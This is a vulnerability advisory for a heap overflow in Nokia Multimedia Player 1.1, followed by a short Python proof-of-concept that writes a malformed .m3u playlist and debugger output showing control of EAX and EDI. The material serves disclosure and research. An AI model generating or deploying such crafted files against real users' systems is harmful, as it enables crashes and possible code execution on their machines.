source: https://www.securityfocus.com/bid/33586/info

Nokia Multimedia Player is prone to a heap-based buffer-overflow vulnerability because it fails to perform adequate boundary checks on user-supplied input.

Successfully exploiting this issue may allow remote attackers to execute arbitrary code in the context of the application. Failed exploit attempts will cause denial-of-service conditions.

Nokia Multimedia Player 1.1 is vulnerable; other versions may also be affected. 

# Nokia Multimedia Player version 1.1 .m3u Heap Overflow PoC exploit
# by 0in aka zer0in from Dark-Coders Group! [0in.email[at]gmail.com] / 0in[at]dark-coders.pl]
#   http://www.Dark-Coders.pl
#   Special thx to doctor ( for together analyse this shi*) and sun8hclf ( for tell me.. "to unicode.")
#   Greetings to: Die,m4r1usz,cOndemned (;> ?),joker,chomzee,TBH
#       Nokia Multimedia Player is a element of Nokia PC Suite packet.
#       DOWNLOAD:http://europe.nokia.com/A4144905
#           Vuln:
#                   This is heap overflow vuln, we can control EAX & EDI registers
#                   (on my Windows XP sp3) with UNICODE chars...
#           DEBUG:
#                       "Access violation when reading [00130013]" 
#                        EAX 00130013  <- ! 
#                        EDX 00000000
#                        EBX 00970000
#                        ESP 0012F96C
#                        EBP 0012FB8C
#                        ESI 00AD26B0
#                        EDI 00900011  <- ! 
#                        EIP 7C910CB0 ntdll.7C910CB0
#!/usr/bin/python
eax="\x13\x13" # eax : 00130013
edi="\x11\x90"  # edi : 00900011
buf="F"*261
buf+=edi+eax
buf+="B"*235
file_name="spl0.m3u"
ce=buf
f=open(file_name,'w')
f.write(ce)
f.close()
print 'PoC created!'